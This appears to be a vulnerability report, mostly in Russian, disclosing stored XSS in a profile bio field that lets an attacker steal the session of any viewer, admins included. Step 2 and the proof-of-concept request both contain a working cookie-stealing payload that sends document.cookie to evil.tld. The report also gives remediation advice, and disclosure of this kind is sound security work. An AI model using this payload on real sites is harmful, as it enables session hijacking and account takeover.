# Cross-Site Scripting (XSS): Stored XSS in user profile bio allows session theft of any viewer

## Summary
Поле bio в профиле пользователя сохраняется без санитизации и рендерится как HTML на странице просмотра профиля, что позволяет внедрить JavaScript, выполняемый в контексте любого посетителя профиля.

## Impact
- **Security property violated:** Confidentiality (session tokens), Integrity (page content)
- **Attacker achieves:** Кража сессии любого пользователя (включая админа), просмотревшего профиль; действия от его имени
- **Who is affected:** Все пользователи, открывшие профиль атакующего; включая админов
- **Worst case:** Захват админской сессии → доступ к админ-панели → массовая компрометация данных

## Steps to Reproduce

1. Зарегистрировать аккаунт A, зайти в настройки профиля
2. В поле bio вставить: <img src=x onerror="fetch('//evil.tld/?c='+document.cookie)">
3. Сохранить профиль (PUT /api/v2/user/profile)
4. Аккаунтом B (или админом) открыть страницу профиля A
5. Наблюдать: выполняется JS, cookie отправляется на evil.tld

## Proof of Concept

```
PUT /api/v2/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=A...

{"bio": "<img src=x onerror=\"fetch('//evil.tld/?c='+document.cookie)\">"}
```

## Root Cause
Значение bio сохраняется в БД как есть и вставляется в DOM через innerHTML без санитизации на этапе рендеринга.

## Remediation
Использовать textContent вместо innerHTML при рендере bio; добавить CSP с nonce и запретом inline-скриптов; на входе — серверную санитизацию (DOMPurify) с allowlist.

---
*CVSS: AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (8.7) | Severity: High (7.0-8.9) | 2026-10-29*